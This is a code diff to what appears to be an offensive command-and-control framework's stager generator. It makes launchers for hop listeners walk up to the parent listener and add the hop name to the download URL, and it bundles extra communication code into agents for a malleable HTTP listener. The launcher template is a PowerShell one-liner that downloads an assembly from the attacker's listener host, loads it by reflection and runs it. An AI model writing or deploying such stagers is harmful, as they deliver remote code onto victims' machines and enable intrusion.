@@ -203,13 +203,22 @@ class Stagers(object):
         Generate a oneliner for a executable
         """
         listener = self.mainMenu.listenersv2.get_active_listener_by_name(listener_name)
+
+        if getattr(listener, "parent_listener", None) is not None:
+            hop = listener.options["Name"]["Value"]
+            while getattr(listener, "parent_listener", None) is not None:
+                listener = self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener.parent_listener.name
+                )
+        else:
+            hop = ""
         host = listener.options["Host"]["Value"]
         launcher_front = listener.options["Launcher"]["Value"]
 
         # Encoded launcher requires a sleep
         launcher = f"""
         $wc=New-Object System.Net.WebClient;
-        $bytes=$wc.DownloadData("{host}/download/{language}/");
+        $bytes=$wc.DownloadData("{host}/download/{language}/{hop}");
         $assembly=[Reflection.Assembly]::load($bytes);
         $assembly.GetType("Program").GetMethod("Main").Invoke($null, $null);
         """
@@ -794,5 +803,10 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
                 stager_code = stager_code + f"\nkey = b'{session_key}'"
                 launch_code = ""
 
-                full_agent = "\n".join([stager_code, agent_code, launch_code])
+                if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
+                    full_agent = "\n".join(
+                        [stager_code, agent_code, comms_code, launch_code]
+                    )
+                else:
+                    full_agent = "\n".join([stager_code, agent_code, launch_code])
                 return full_agent
